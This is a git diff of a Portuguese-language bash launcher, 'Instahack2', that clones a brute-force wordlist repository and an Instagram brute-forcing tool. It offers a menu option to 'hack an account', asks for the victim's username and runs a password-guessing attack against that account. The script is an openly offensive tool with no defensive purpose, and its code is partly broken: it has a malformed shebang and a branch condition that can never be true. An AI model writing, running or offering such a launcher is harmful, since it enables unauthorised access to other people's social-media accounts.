@@ -1,40 +1,41 @@
-#!/bin/bash
+#!/usr/bin/bash/
 #
-#Atualizando pacotes de instalação
-apt-get update
-apt-get upgrade
-apt-get git
 #
-if [ "cl" ];then
-find Brute-Force; find Instagram
-        echo "Diretório encontrado"
-clear
+if [ "oi" = "1" ];then
+find Brute-Force
+        echo "Encontrei"
 else
-clear
-        figlet "Diretorio nao encontrado"
+        echo "Nao encontrei"
 git clone https://github.com/MRX8001/Brute-Force
 git clone https://github.com/Pure-L0G1C/Instagram
 fi
+#
+#
 clear
 figlet Instahack2
-echo "====================================================="
-echo "= [1]=> Invadir uma conta				  ="
-echo "= [2]=> Sair				          ="
-echo "====================================================="
+#
+#MENU
+echo
+echo "========================================================="
+echo "= \033[1;36m[\033[1;36m1]>> \033[1;33mInvadir uma conta"
+echo "= \033[1;36m[\033[1;36m2]>> \033[1;33mSair"
+echo "========================================================="
+echo
 read -p "[+]=>" instahack
 #
-#
-if [ "instahack" = "1" ];then
+if [ "$instahack" = "1" ];then
 clear
-echo
- echo "[+]=>DIGITE O NOME DA VÍTIMA"
+figlet Instahack2
+echo "\033[1;32m\n\n[+]=>DIGITE OU COLE O NOME DA VÍTIMA exe:(pedro1234)"
 #
-read -p "[+]=>" hack
+read -p "[+]=>" vitima
 #
-fi
-if [ "hack" = "1" ];then
-#Start
+#Iniciando o ataque
+clear
+figlet START
 cd Instagram
 pip2 install -r requirements.txt
-python2 intagram.py $hack /home/default00/instahack2/Brute-Force/wordlist/wordlist.txt -m 3
+python3 instagram.py $vitima /$HOME/instahack2/Brute-Force/wordlist/wordlist.txt -m 3
 fi
+exit
+
